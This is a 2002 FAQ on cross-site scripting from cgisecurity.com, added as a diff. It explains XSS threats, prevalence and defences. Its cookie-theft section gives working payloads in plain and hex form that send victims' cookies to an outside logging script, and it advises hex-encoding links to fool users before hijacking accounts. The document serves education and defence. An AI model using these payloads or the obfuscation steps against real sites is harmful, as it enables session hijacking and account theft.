@@ -1,0 +1,278 @@
+                                            Article #2
+                                      admin@cgisecurity.com
+                                 "The Cross Site Scripting FAQ"
+
+Revised: 7/02
+
+
+Introduction
+What is Cross Site Scripting?
+What does XSS and CSS mean?
+What are the threats of Cross Site Scripting?
+What are some examples of cross site scripting attacks?
+Can you show me what cookie theft looks like? 
+What can I do to protect myself as a vendor?
+What can I do to protect myself as a user?
+How common are CSS/XSS holes?
+Does encryption protect me?
+Can CSS/XSS holes allow command execution?
+What if I don't feel like fixing a CSS/XSS Hole?
+What are some links I can visit to help me further understand XSS?                    
+
+
+
+Introduction
+
+Websites today are more complex than ever, containing a lot of dynamic content making the
+experience for the user more enjoyable. Dynamic content is achieved through the use of web
+applications which can deliver different output to a user depending on their settings and needs.
+Dynamic websites have a threat that static websites don't, called "Cross Site Scripting" (or XSS
+dubbed by other security professionals). Currently small informational tidbits about Cross Site
+Scripting holes exist but none really explain them to an average person or administrator. This
+FAQ was written to provide a better understanding of this emerging threat, and to give guidance
+on detection and prevention. 
+
+
+"What is Cross Site Scripting?"
+
+Cross site scripting (also known as XSS) occurs when a web application gathers malicious data
+from a user. The data is usually gathered in the form of a hyperlink which contains malicious
+content within it. The user will most likely click on this link from another website, web board,
+email, or from an instant message. Usually the attacker will encode the malicious portion of the
+link to the site in HEX (or other encoding methods) so the request is less suspicious looking to
+the user when clicked on. After the data is collected by the web application, it creates an
+output page for the user containing the malicious data that was originally sent to it, but in a
+manner to make it appear as valid content from the website. 
+
+
+"What does XSS and CSS mean?"
+
+Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with
+Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site
+Scripting as XSS. If you hear someone say "I found a XSS hole", they are talking about Cross Site
+Scripting for certain.
+
+
+"What are the threats of Cross Site Scripting?"
+
+Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash to fool a user (Read
+below for further details), or gather data from them. Everything from account hijacking, changing
+of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses
+are being found every day for XSS attacks. The post below by Brett Moore brings up a good point
+with regard to "Denial Of Service", and potential "auto-attacking" of hosts if a user simply
+reads a post on a message board. 
+
+http://archives.neohapsis.com/archives/vuln-dev/2002-q1/0311.html
+
+
+"What are some examples of cross site scripting attacks?"
+
+One product with many XSS holes is the popular PHP program PHPnuke. This product is often
+targeted by attackers to probe for XSS holes because of its popularity. I have included a few
+links of advisories/reports that have been discovered and disclosed just from this product alone.
+The following collection should provide plenty of examples.
+
+http://www.cgisecurity.com/archive/php/phpNuke_cross_site_scripting.txt
+http://www.cgisecurity.com/archive/php/phpNuke_CSS_5_holes.txt
+http://www.cgisecurity.com/archive/php/phpNuke_2_more_CSS_holes.txt
+
+
+"Can you show me what XSS cookie theft looks like?"
+
+Depending on the particular web application some of the variables and positioning of the
+injections may need to be adjusted. Keep in mind the following is a simple example of an
+attacker's methodology.
+
+Step 1: Targeting
+
+After you have found an XSS hole in a web application on a website, check to see if it issues
+cookies. If any part of the website uses cookies, then it is possible to steal them from its
+users. 
+
+Step 2: Testing
+
+Since XSS holes are different in how they are exploited, some testing will need to be done in
+order to make the output believable. By inserting code into the script, its output will be
+changed and the page may appear broken. (The end result is crucial and the attacker will have to
+do some touching up in the code to make the page appear normal.) Next you will need to insert
+some Javascript (or other client side scripting language) into the URL pointing to the part of
+the site which is vulnerable. Below I have provided a few links that are for public use when
+testing for XSS holes. These links below, when clicked on will send the users cookie to
+www.cgisecurity.com/cgi-bin/cookie.cgi and will display it. If you see a page displaying a cookie
+then session hijacking of the user's account may be possible.
+
+
+Cookie theft Javascript Examples.
+A example of usage is below.
+
+ASCII Usage:
+
+http://host/a.php?variable="><script>document.location='http://www.cgisecurity.com/cgi-bin/cookie.cgi?
+'%20+document.cookie</script> 
+
+Hex Usage:
+
+http://host/a.php?variable=%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f
+%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%77%77%77%2e%63%67%69%73%65%63%75%72%69%74%79
+%2e%63%6f%6d%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63%
+75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e
+
+
+NOTE: The request is first shown in ASCII, then in Hex for copy and paste purposes.
+
+1. "><script>document.location='http://www.cgisecurity.com/cgi-bin/cookie.cgi?'
++document.cookie</script> 
+
+HEX %22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27
+%68%74%74%70%3a%2f%2f%77%77%77%2e%63%67%69%73%65%63%75%72%69%74%79%2e%63%6f%6d%2f%63%67%69
+%2d%62%69%6e%2f%63%6f%6f%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f
+%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e
+
+2. <script>document.location='http://www.cgisecurity.com/cgi-bin/cookie.cgi?'
++document.cookie</script> 
+
+HEX %3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74
+%70%3a%2f%2f%77%77%77%2e%63%67%69%73%65%63%75%72%69%74%79%2e%63%6f%6d%2f%63%67%69%2d%62%69%6e
+%2f%63%6f%6f%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c
+%2f%73%63%72%69%70%74%3e
+
+3. ><script&gtdocument.location='http://www.cgisecurity.com/cgi-bin/cookie.cgi?'
++document.cookie</script> 
+
+HEX %3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74
+%74%70%3a%2f%2f%77%77%77%2e%63%67%69%73%65%63%75%72%69%74%79%2e%63%6f%6d%2f%63%67%69%2d%62%69
+%6e%2f%63%6f%6f%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65
+%3c%2f%73%63%72%69%70%74%3e
+
+
+These are the examples of "evil" Javascript we will be using. These Javascript examples gather
+the users cookie and then send a request to the cgisecurity.com website with the cookie in the
+query. My script on cgisecurity.com logs each request and each cookie. In simple terms it is
+doing the following:
+
+My cookie = user=zeno; id=021
+My script = www.cgisecurity.com/cgi-bin/cookie.cgi
+
+It sends a request to my site that looks like this.
+
+GET /cgi-bin/cookie.cgi?user=zeno;%20id=021 (Note: %20 is a hex encoding for a space)
+
+This is a primitive but effective way of grabbing a user's cookie. Logs of the use of this public
+script can be found at www.cgisecurity.com/articles/cookie-theft.log 
+
+Step 3: XSS Execution
+
+Hand out your crafted url or use email or other related software to help launch it. Make sure
+that if you provide the URL to the user(through email, aim, or other means) that you at least HEX
+encode it. The code is obviously suspicious looking but a bunch of hex characters may fool a few
+people.
+
+In my example I only forward the user to cookie.cgi. A attacker with more time could do a few
+redirects and XSS combo's to steal the user's cookie, and return them to the website without
+noticing the cookie theft. 
+
+Some email programs may execute the Javascript upon the opening of a message or if the Javascript
+is contained in a message attachment. Larger sites like Hotmail do allow Javascript inside
+attachments but they do special filtering to prevent cookie theft. 
+
+Step 4: What to do with this data
+
+Once you have gotten the user to execute the XSS hole, the data is collected and sent to your CGI
+script. Now that you have the cookie you can use a tool like Websleuth to see if account
+hijacking is possible. 
+
+This is only a FAQ, not a detailed paper on cookie theft and modification. A new paper released
+by David Endler of iDefense goes into more detail on some of the ways to automatically launch XSS
+holes. This paper can be found at http://www.idefense.com/XSS.html. 
+
+
+"What can I do to protect myself as a vendor?"
+
+This is a simple answer. Never trust user input and always filter metacharacters. This will
+eliminate the majority of XSS attacks. Converting < and > to &lt; and &gt; is also suggested when
+it comes to script output. Remember XSS holes can be damaging and costly to your business if
+abused. Often attackers will disclose these holes to the public, which can erode customer and
+public confidence in the security and privacy of your organization's site. Filtering < and >
+alone will not solve all cross site scripting attacks and it is suggested you also attempt to
+filter out ( and ) by translating them to &#40; and &#41;, , and also # and & by translating them
+to &#35 (#) and &#38 (&). 
+
+
+"What can I do to protect myself as a user?"
+
+The easiest way to protect yourself as a user is to only follow links from the main website you
+wish to view. If you visit one website and it links to CNN for example, instead of clicking on it
+visit CNN's main site and use its search engine to find the content. This will probably eliminate
+ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email
+or attachment. If you are receiving email from a person you don't know (or don't like) don't
+trust anything it has to say. Another way to protect yourself is to turn off Javascript in your
+browser settings. In IE turn your security settings to high. This can prevent cookie theft, and
+in general is a safer thing to do.
+
+
+"How common are XSS holes?"
+
+Cross site scripting holes are gaining popularity among hackers as easy holes to find in large
+websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft,
+Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs. 
+
+Every month roughly 10-25 XSS holes are found in commercial products and advisories are published
+explaining the threat. 
+
+
+"Does encryption protect me?"
+
+Websites that use SSL (https) are in no way more protected than websites that are not encrypted.
+The web applications work the same way as before, except the attack is taking place in an
+encrypted connection. People often think that because they see the lock on their browser it means
+everything is secure. This just isn't the case.
+
+
+"Can XSS holes allow command execution?"
+
+XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker
+were to exploit a browser flaw (browser hole) it could then be possible to execute commands on
+the client's side. If command execution were possible it would only be possible on the client
+side. In simple terms XSS holes can be used to help exploit other holes that may exist in your
+browser.
+
+
+"What if I don't feel like fixing a CSS/XSS Hole?"
+
+By not fixing an XSS hole this could allow possible user account compromise in portions of your
+site as they get added or updated. Cross Site Scripting has been found in various large sites
+recently and have been widely publicized. Left unrepaired, someone may discover it and publish a
+warning about your company. This may damage your company's reputation, depicting it as being lax
+on security matters. This of course also sends the message to your clients that you aren't
+dealing with every problem that arises, which turns into a trust issue. If your client doesn't
+trust you why would they wish to do business with you?
+
+
+"What are some links I can visit to help me further understand XSS?"
+
+"Cross-site scripting tears holes in Net security"
+http://www.usatoday.com/life/cyber/tech/2001-08-31-hotmail-security-side.htm
+
+Article on XSS holes
+http://www.perl.com/pub/a/2002/02/20/css.html
+
+"CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests"
+http://www.cert.org/advisories/CA-2000-02.html
+
+Paper on Removing Meta-characters from User Supplied Data in CGI Scripts.
+http://www.cert.org/tech_tips/cgi_metacharacters.html
+
+Paper on Microsoft's Passport System
+http://eyeonsecurity.net/papers/passporthijack.html
+
+Paper on Cookie Theft
+http://www.eccentrix.com/education/b0iler/tutorials/javascript.htm#cookies
+
+The webappsec mailing list (Visit www.securityfocus for details)
+webappsec@securityfocus.com
+
+Many Thanks to David Endler for reviewing this document.
+
+
+Published to the Public May 2002
+Copyright May 2002 Cgisecurity.com
